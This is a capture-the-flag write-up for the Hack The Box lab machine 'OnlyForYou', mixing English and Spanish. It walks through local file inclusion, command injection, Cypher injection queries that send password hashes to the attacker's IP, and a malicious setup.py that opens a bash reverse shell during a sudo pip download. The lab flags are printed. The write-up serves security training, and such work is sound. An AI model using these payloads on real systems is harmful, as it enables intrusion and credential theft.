---
tags:
title: OnlyForYou - Medium (HTB)
permalink: /OnlyForYou-HTB-Writeup
cssclasses:
toc_label: Topics
toc: true
toc_sticky: true
sidebar: main
---
---
# Recon

```bash
nmapf 10.129.206.80
Nmap Full scan in progress
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-18 01:01 -0500
Initiating Ping Scan at 01:01
Scanning 10.129.206.80 [4 ports]
Completed Ping Scan at 01:01, 0.39s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 01:01
Completed Parallel DNS resolution of 1 host. at 01:01, 0.50s elapsed
Initiating SYN Stealth Scan at 01:01
Scanning 10.129.206.80 [65535 ports]
Discovered open port 80/tcp on 10.129.206.80
Discovered open port 22/tcp on 10.129.206.80
Completed SYN Stealth Scan at 01:02, 9.24s elapsed (65535 total ports)
Nmap scan report for 10.129.206.80
Host is up, received echo-reply ttl 63 (0.36s latency).
Scanned at 2026-02-18 01:01:57 EST for 9s
Not shown: 62782 closed tcp ports (reset), 2751 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 10.28 seconds
           Raw packets sent: 85252 (3.751MB) | Rcvd: 72872 (2.915MB)
-e [*] IP: 10.129.206.80
[*] Puertos abiertos: 22,80
/usr/bin/xclip
-e [*] Service scanning with nmap against 22,80 Ports..
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-18 01:02 -0500
Nmap scan report for 10.129.206.80
Host is up (0.45s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 e8:83:e0:a9:fd:43:df:38:19:8a:aa:35:43:84:11:ec (RSA)
|   256 83:f2:35:22:9b:03:86:0c:16:cf:b3:fa:9f:5a:cd:08 (ECDSA)
|_  256 44:5f:7a:a3:77:69:0a:77:78:9b:04:e0:9f:11:db:80 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://only4you.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 39.30 seconds
```

## Website

![[Pasted image 20260218031838.png]]

### Subdomain enumeration

```bash
wfuzz -c -t 200 -H "Host: FUZZ.only4you.htb" -u http://only4you.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt  --hl 7
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://only4you.htb/
Total requests: 114442

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000033:   200        51 L     145 W      2190 Ch     "beta"
```

```bash
addhost 10.129.206.80 beta.only4you.htb
[+] Appended beta.only4you.htb to existing entry for 10.129.206.80 in /etc/hosts
10.129.206.80 only4you.htb beta.only4you.htb
```

![[Pasted image 20260218032206.png]]

```bash
7z l source.zip

7-Zip 25.01 (x64) : Copyright (c) 1999-2025 Igor Pavlov : 2025-08-03
 64-bit locale=en_US.UTF-8 Threads:128 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 12127 bytes (12 KiB)

Listing archive: source.zip

--
Path = source.zip
Type = zip
Physical Size = 12127

   Date      Time    Attr         Size   Compressed  Name
------------------- ----- ------------ ------------  ------------------------
2022-12-04 10:11:45 D....            0            0  beta
2022-11-29 13:23:41 .....         4374         1252  beta/app.py
2022-12-04 10:11:43 D....            0            0  beta/static
2022-10-31 14:01:26 D....            0            0  beta/static/img
2022-10-31 14:00:54 .....          948          407  beta/static/img/image-resize.svg
2022-11-01 13:22:51 D....            0            0  beta/templates
2022-10-31 12:36:41 .....          676          374  beta/templates/400.html
2022-10-31 12:36:41 .....          677          369  beta/templates/500.html
2022-11-01 13:37:19 .....         3068         1327  beta/templates/convert.html
2022-11-01 11:33:43 .....         2242          992  beta/templates/index.html
2022-10-31 12:36:41 .....          683          378  beta/templates/405.html
2022-11-03 15:43:43 .....         6245         1401  beta/templates/list.html
2022-11-01 13:37:20 .....         3992         1551  beta/templates/resize.html
2022-10-31 12:41:24 .....          674          369  beta/templates/404.html
2022-11-01 15:23:08 D....            0            0  beta/uploads
2022-11-03 15:44:32 D....            0            0  beta/uploads/resize
2022-11-03 15:44:29 D....            0            0  beta/uploads/list
2022-11-03 15:48:37 D....            0            0  beta/uploads/convert
2022-11-03 15:49:41 .....         1721          515  beta/tool.py
------------------- ----- ------------ ------------  ------------------------
2022-12-04 10:11:45              25300         8935  11 files, 8 folders
```

```python
cat app.py
from flask import Flask, request, send_file, render_template, flash, redirect, send_from_directory
import os, uuid, posixpath
from werkzeug.utils import secure_filename
from pathlib import Path
from tool import convertjp, convertpj, resizeimg

app = Flask(__name__)
app.secret_key = uuid.uuid4().hex
app.config['MAX_CONTENT_LENGTH'] = 1024 * 1024
app.config['RESIZE_FOLDER'] = 'uploads/resize'
app.config['CONVERT_FOLDER'] = 'uploads/convert'
app.config['LIST_FOLDER'] = 'uploads/list'
app.config['UPLOAD_EXTENSIONS'] = ['.jpg', '.png']

@app.route('/', methods=['GET'])
def main():
    return render_template('index.html')

@app.route('/resize', methods=['POST', 'GET'])
def resize():
    if request.method == 'POST':
        if 'file' not in request.files:
            flash('Something went wrong, Try again!', 'danger')
            return redirect(request.url)
        file = request.files['file']
        img = secure_filename(file.filename)
        if img != '':
            ext = os.path.splitext(img)[1]
            if ext not in app.config['UPLOAD_EXTENSIONS']:
                flash('Only png and jpg images are allowed!', 'danger')
                return redirect(request.url)
            file.save(os.path.join(app.config['RESIZE_FOLDER'], img))
            status = resizeimg(img)
            if status == False:
                flash('Image is too small! Minimum size needs to be 700x700', 'danger')
                return redirect(request.url)
            else:
                flash('Image is succesfully uploaded!', 'success')
        else:
            flash('No image selected!', 'danger')
            return redirect(request.url)
        return render_template('resize.html', clicked="True"), {"Refresh": "5; url=/list"}
    else:
        return render_template('resize.html', clicked="False")

@app.route('/convert', methods=['POST', 'GET'])
def convert():
    if request.method == 'POST':
        if 'file' not in request.files:
            flash('Something went wrong, Try again!', 'danger')
            return redirect(request.url)
        file = request.files['file']
        img = secure_filename(file.filename)
        if img != '':
            ext = os.path.splitext(img)[1]
            if ext not in app.config['UPLOAD_EXTENSIONS']:
                flash('Only jpg and png images are allowed!', 'danger')
                return redirect(request.url)
            file.save(os.path.join(app.config['CONVERT_FOLDER'], img))
            if ext == '.png':
                image = convertpj(img)
                return send_from_directory(app.config['CONVERT_FOLDER'], image, as_attachment=True)
            else:
                image = convertjp(img)
                return send_from_directory(app.config['CONVERT_FOLDER'], image, as_attachment=True)
        else:
            flash('No image selected!', 'danger')
            return redirect(request.url)
        return render_template('convert.html')
    else:
        [f.unlink() for f in Path(app.config['CONVERT_FOLDER']).glob("*") if f.is_file()]
        return render_template('convert.html')

@app.route('/source')
def send_report():
    return send_from_directory('static', 'source.zip', as_attachment=True)

@app.route('/list', methods=['GET'])
def list():
    return render_template('list.html')

@app.route('/download', methods=['POST'])
def download():
    image = request.form['image']
    filename = posixpath.normpath(image)
    if '..' in filename or filename.startswith('../'):
        flash('Hacking detected!', 'danger')
        return redirect('/list')
    if not os.path.isabs(filename):
        filename = os.path.join(app.config['LIST_FOLDER'], filename)
    try:
        if not os.path.isfile(filename):
            flash('Image doesn\'t exist!', 'danger')
            return redirect('/list')
    except (TypeError, ValueError):
        raise BadRequest()
    return send_file(filename, as_attachment=True)

@app.errorhandler(404)
def page_not_found(error):
    return render_template('404.html'), 404

@app.errorhandler(500)
def server_error(error):
    return render_template('500.html'), 500

@app.errorhandler(400)
def bad_request(error):
    return render_template('400.html'), 400

@app.errorhandler(405)
def method_not_allowed(error):
    return render_template('405.html'), 405

if __name__ == '__main__':
    app.run(host='127.0.0.1', port=80, debug=False) 
```

![[Pasted image 20260218034841.png]]

![[Pasted image 20260218034906.png]]

```bash
curl -s -L -X POST 'http://beta.only4you.htb/download' -d 'image=/etc/passwd'
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
john:x:1000:1000:john:/home/john:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:113:117:MySQL Server,,,:/nonexistent:/bin/false
neo4j:x:997:997::/var/lib/neo4j:/bin/bash
dev:x:1001:1001::/home/dev:/bin/bash
fwupd-refresh:x:114:119:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
_laurel:x:996:996::/var/log/laurel:/bin/false
```

```bash
curl -s -L -X POST 'http://beta.only4you.htb/download' -d 'image=/var/www/only4you.htb/app.py'
from flask import Flask, render_template, request, flash, redirect
from form import sendmessage
import uuid

app = Flask(__name__)
app.secret_key = uuid.uuid4().hex

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        email = request.form['email']
        subject = request.form['subject']
        message = request.form['message']
        ip = request.remote_addr

        status = sendmessage(email, subject, message, ip)
        if status == 0:
            flash('Something went wrong!', 'danger')
        elif status == 1:
            flash('You are not authorized!', 'danger')
        else:
            flash('Your message was successfuly sent! We will reply as soon as possible.', 'success')
        return redirect('/#contact')
    else:
        return render_template('index.html')

@app.errorhandler(404)
def page_not_found(error):
    return render_template('404.html'), 404

@app.errorhandler(500)
def server_errorerror(error):
    return render_template('500.html'), 500

@app.errorhandler(400)
def bad_request(error):
    return render_template('400.html'), 400

@app.errorhandler(405)
def method_not_allowed(error):
    return render_template('405.html'), 405

if __name__ == '__main__':
    app.run(host='127.0.0.1', port=80, debug=False)
```

Excelente! Ahora tenemos las piezas del rompecabezas. Sin embargo, hay un detalle clave: el archivo `app.py` que acabas de leer mediante LFI **es distinto** al primero que analizamos.

El nuevo `app.py` importa una función que no teníamos en el radar: `from form import sendmessage`

### El Nuevo Objetivo: `form.py`

En el endpoint `/` (index), cuando envías el formulario de contacto, se ejecuta: `status = sendmessage(email, subject, message, ip)`

Históricamente, en esta máquina de HTB, la función `sendmessage` suele utilizar comandos del sistema (como `curl` o `sendmail`) para procesar el mensaje, lo que frecuentemente deriva en una **Command Injection**.


```bash
curl -s -X POST 'http://beta.only4you.htb/download' -d 'image=/var/www/only4you.htb/form.py'
import smtplib, re
from email.message import EmailMessage
from subprocess import PIPE, run
import ipaddress

def issecure(email, ip):
	if not re.match("([A-Za-z0-9]+[.-_])*[A-Za-z0-9]+@[A-Za-z0-9-]+(\.[A-Z|a-z]{2,})", email):
		return 0
	else:
		domain = email.split("@", 1)[1]
		result = run([f"dig txt {domain}"], shell=True, stdout=PIPE)
		output = result.stdout.decode('utf-8')
		if "v=spf1" not in output:
			return 1
		else:
			domains = []
			ips = []
			if "include:" in output:
				dms = ''.join(re.findall(r"include:.*\.[A-Z|a-z]{2,}", output)).split("include:")
				dms.pop(0)
				for domain in dms:
					domains.append(domain)
				while True:
					for domain in domains:
						result = run([f"dig txt {domain}"], shell=True, stdout=PIPE)
						output = result.stdout.decode('utf-8')
						if "include:" in output:
							dms = ''.join(re.findall(r"include:.*\.[A-Z|a-z]{2,}", output)).split("include:")
							domains.clear()
							for domain in dms:
								domains.append(domain)
						elif "ip4:" in output:
							ipaddresses = ''.join(re.findall(r"ip4:+[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+[/]?[0-9]{2}", output)).split("ip4:")
							ipaddresses.pop(0)
							for i in ipaddresses:
								ips.append(i)
						else:
							pass
					break
			elif "ip4" in output:
				ipaddresses = ''.join(re.findall(r"ip4:+[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+[/]?[0-9]{2}", output)).split("ip4:")
				ipaddresses.pop(0)
				for i in ipaddresses:
					ips.append(i)
			else:
				return 1
		for i in ips:
			if ip == i:
				return 2
			elif ipaddress.ip_address(ip) in ipaddress.ip_network(i):
				return 2
			else:
				return 1

def sendmessage(email, subject, message, ip):
	status = issecure(email, ip)
	if status == 2:
		msg = EmailMessage()
		msg['From'] = f'{email}'
		msg['To'] = 'info@only4you.htb'
		msg['Subject'] = f'{subject}'
		msg['Message'] = f'{message}'

		smtp = smtplib.SMTP(host='localhost', port=25)
		smtp.send_message(msg)
		smtp.quit()
		return status
	elif status == 1:
		return status
	else:
		return status
```

```bash
gen_lin_rev 10.10.17.19 4444
[+] Wrote Linux reverse shells to /home/zsln/Desktop/zsln/Onlyforyou/beta/index.html
```

![[Pasted image 20260218041052.png]]

```bash
 www
[eth0] 192.168.100.8
[docker0] 172.17.0.1
[br-427beff723d7] 172.18.0.1
[tun0] 10.10.17.19
[/home/zsln/Desktop/zsln/Onlyforyou/beta]
app.py   cmd.php      gato.jpg    static     tool.py
cmd.jpg  cmd.php.jpg  index.html  templates  uploads
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.206.80 - - [18/Feb/2026 02:10:35] "GET / HTTP/1.1" 200 -
```

```bash
sudo nc -nvlp 4444
listening on [any] 4444 ...
connect to [10.10.17.19] from (UNKNOWN) [10.129.206.80] 37428
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
```

```bash
www-data@only4you:/home$ find / -perm -4000 2>/dev/null
/usr/bin/mount
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/gpasswd
/usr/bin/umount
/usr/bin/su
/usr/bin/fusermount
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/at
/usr/bin/newgrp
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
```

```bash
www-data@only4you:/home$ ss -tulpn
Netid  State   Recv-Q  Send-Q        Local Address:Port      Peer Address:Port  Process
udp    UNCONN  0       0             127.0.0.53%lo:53             0.0.0.0:*
udp    UNCONN  0       0                   0.0.0.0:68             0.0.0.0:*
tcp    LISTEN  0       151               127.0.0.1:3306           0.0.0.0:*
tcp    LISTEN  0       511                 0.0.0.0:80             0.0.0.0:*      users:(("nginx",pid=1031,fd=6),("nginx",pid=1030,fd=6))
tcp    LISTEN  0       4096          127.0.0.53%lo:53             0.0.0.0:*
tcp    LISTEN  0       128                 0.0.0.0:22             0.0.0.0:*
tcp    LISTEN  0       4096              127.0.0.1:3000           0.0.0.0:*
tcp    LISTEN  0       2048              127.0.0.1:8001           0.0.0.0:*
tcp    LISTEN  0       70                127.0.0.1:33060          0.0.0.0:*
tcp    LISTEN  0       50       [::ffff:127.0.0.1]:7474                 *:*
tcp    LISTEN  0       128                    [::]:22                [::]:*
tcp    LISTEN  0       4096     [::ffff:127.0.0.1]:7687                 *:*
```

```bash
chisel_socks 10.10.17.19 5555
[+] copied chisel client -v 10.10.17.19:5555 R:socks in clipboard
2026/02/18 02:15:21 server: Reverse tunnelling enabled
2026/02/18 02:15:21 server: Fingerprint V4fOFJHCU5buDmefTkrNfRK51O77jlBrjDSpWc/Krm8=
2026/02/18 02:15:21 server: Listening on http://0.0.0.0:5555
```

```bash
www-data@only4you:/tmp$ ./chisel client 10.10.17.19:5555 R:3000:127.0.0.1:3000 R:8000:127.0.0.1:8000
2026/02/18 07:20:34 client: Connecting to ws://10.10.17.19:5555
2026/02/18 07:20:39 client: Connected (Latency 345.011624ms)
```


![[Pasted image 20260218041804.png]]

![[Pasted image 20260218041948.png]]

![[Pasted image 20260218042331.png]]

![[Pasted image 20260218043413.png]]

![[Pasted image 20260218043422.png]]


```bash
estSarah' OR 1=1 CALL db.labels() YIELD label LOAD CSV FROM 'http://10.10.17.19/?label='   label AS l RETURN 0 //
```


```bash
www
[eth0] 192.168.100.8
[docker0] 172.17.0.1
[br-427beff723d7] 172.18.0.1
[tun0] 10.10.17.19
[/home/zsln/Desktop/zsln/Onlyforyou]
allPorts  beta  port_scan  req.txt
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.206.80 - - [18/Feb/2026 02:59:05] code 400, message Bad request syntax ('GET /<!DOCTYPE html> HTTP/1.1')
10.129.206.80 - - [18/Feb/2026 02:59:05] "GET /<!DOCTYPE html> HTTP/1.1" 400 -
10.129.206.80 - - [18/Feb/2026 02:59:46] "GET /?label=user HTTP/1.1" 200 -
10.129.206.80 - - [18/Feb/2026 02:59:48] "GET /?label=employee HTTP/1.1" 200 -
```

```bash
' OR 1=1 MATCH (u:user) UNWIND keys(u) as p LOAD CSV FROM 'http://10.10.17.19/?' + u.username + '=' + u.password AS l RETURN 0 //
```

```bash
www
[eth0] 192.168.100.8
[docker0] 172.17.0.1
[br-427beff723d7] 172.18.0.1
[tun0] 10.10.17.19
[/home/zsln/Desktop/zsln/Onlyforyou]
allPorts  beta  port_scan  req.txt
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.206.80 - - [18/Feb/2026 03:00:53] "GET /?admin=8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918 HTTP/1.1" 200 -
10.129.206.80 - - [18/Feb/2026 03:00:55] "GET /?admin=8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918 HTTP/1.1" 200 -
10.129.206.80 - - [18/Feb/2026 03:00:57] "GET /?john=a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6 HTTP/1.1" 200 -
10.129.206.80 - - [18/Feb/2026 03:00:59] "GET /?john=a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6 HTTP/1.1" 200 -
```

![[Pasted image 20260218050245.png]]

```bash
ssh john@only4you.htb
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
john@only4you.htb's password:
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-146-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed 18 Feb 2026 08:07:36 AM UTC

  System load:           0.02
  Usage of /:            84.8% of 6.23GB
  Memory usage:          50%
  Swap usage:            0%
  Processes:             252
  Users logged in:       0
  IPv4 address for eth0: 10.129.206.80
  IPv6 address for eth0: dead:beef::250:56ff:fe95:ee93


 * Introducing Expanded Security Maintenance for Applications.
   Receive updates to over 25,000 software packages with your
   Ubuntu Pro subscription. Free for personal use.

     https://ubuntu.com/pro

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Tue Apr 18 07:46:32 2023 from 10.10.14.40
john@only4you:~$ cat user.txt
6b0362ac77f6331e8fcd88f401fcc3b1
```

```bash
john@only4you:~$ sudo -l
Matching Defaults entries for john on only4you:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User john may run the following commands on only4you:
    (root) NOPASSWD: /usr/bin/pip3 download http\://127.0.0.1\:3000/*.tar.gz
john@only4you:~$ cat /usr/bin/pip3
#!/usr/bin/python3
# EASY-INSTALL-ENTRY-SCRIPT: 'pip==20.0.2','console_scripts','pip3'
__requires__ = 'pip==20.0.2'
import re
import sys
from pkg_resources import load_entry_point

if __name__ == '__main__':
    sys.argv[0] = re.sub(r'(-script\.pyw?|\.exe)?$', '', sys.argv[0])
    sys.exit(
        load_entry_point('pip==20.0.2', 'console_scripts', 'pip3')()
```

```bash
john@only4you:/tmp$ mkdir test
john@only4you:/tmp$ cd test/
john@only4you:/tmp/test$ nano setup.py
john@only4you:/tmp/test$ cat setup.py
from setuptools import setup
from setuptools.command.install import install
import os

class x(install):
    def run(self):
        # Reverse shell para conectar a tu IP
        os.system("bash -i >& /dev/tcp/10.10.17.19/9999 0>&1")

setup(name='exploit',
      version='0.1',
      cmdclass={'install': x})
```

```bash
john@only4you:/tmp/test$ tar -czvf exploit.tar.gz setup.py
setup.py
```

```bash

```

![[Pasted image 20260218050934.png]]

![[Pasted image 20260218051425.png]]

```python
import setuptools
import os

# Ejecución inmediata al ser leído por pip
os.system("bash -c 'bash -i >& /dev/tcp/10.10.17.19/4444 0>&1'")

setuptools.setup(
    name="pwnpack",
    version="0.0.1",
    author="Car Melo",
    author_email="melo@only4you.htb",
    description="Pack'll get you pwned.",
    packages=setuptools.find_packages(),
    python_requires='>=3.6',
)
```

```bash
python3 setup.py sdist
bash: connect: Connection refused
bash: line 1: /dev/tcp/10.10.17.19/4444: Connection refused
running sdist
running egg_info
creating pwnpack.egg-info
writing pwnpack.egg-info/PKG-INFO
writing dependency_links to pwnpack.egg-info/dependency_links.txt
writing top-level names to pwnpack.egg-info/top_level.txt
writing manifest file 'pwnpack.egg-info/SOURCES.txt'
reading manifest file 'pwnpack.egg-info/SOURCES.txt'
writing manifest file 'pwnpack.egg-info/SOURCES.txt'
running check
creating pwnpack-0.0.1
creating pwnpack-0.0.1/pwnpack.egg-info
copying files to pwnpack-0.0.1...
copying README.md -> pwnpack-0.0.1
copying setup.py -> pwnpack-0.0.1
copying pwnpack.egg-info/PKG-INFO -> pwnpack-0.0.1/pwnpack.egg-info
copying pwnpack.egg-info/SOURCES.txt -> pwnpack-0.0.1/pwnpack.egg-info
copying pwnpack.egg-info/dependency_links.txt -> pwnpack-0.0.1/pwnpack.egg-info
copying pwnpack.egg-info/top_level.txt -> pwnpack-0.0.1/pwnpack.egg-info
copying pwnpack.egg-info/SOURCES.txt -> pwnpack-0.0.1/pwnpack.egg-info
Writing pwnpack-0.0.1/setup.cfg
creating dist
Creating tar archive
removing 'pwnpack-0.0.1' (and everything under it)

┌──(root㉿kali)-[/home/…/Desktop/zsln/Onlyforyou/test]
└─# ls
dist  exploit.tar.gz  pwnpack.egg-info  README.md  setup.py

┌──(root㉿kali)-[/home/…/Desktop/zsln/Onlyforyou/test]
└─# tree
.
├── dist
│   └── pwnpack-0.0.1.tar.gz
├── exploit.tar.gz
├── pwnpack.egg-info
│   ├── dependency_links.txt
│   ├── PKG-INFO
│   ├── SOURCES.txt
│   └── top_level.txt
├── README.md
└── setup.py

3 directories, 8 files
```

```bash
john@only4you:/opt$ sudo /usr/bin/pip3 download http://127.0.0.1:3000/john/Test/raw/master/pwnpack-0.0.1.tar.gz
Collecting http://127.0.0.1:3000/john/Test/raw/master/pwnpack-0.0.1.tar.gz
  Downloading http://127.0.0.1:3000/john/Test/raw/master/pwnpack-0.0.1.tar.gz (951 bytes)
```

```bash
nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.17.19] from (UNKNOWN) [10.129.206.80] 37046
root@only4you:/tmp/pip-req-build-mymaxr3d# id
id
uid=0(root) gid=0(root) groups=0(root)
```

```bash
root@only4you:~# cat root.txt
cat root.txt
5ea4d7b8cf65ca554a662c0075016c9b
```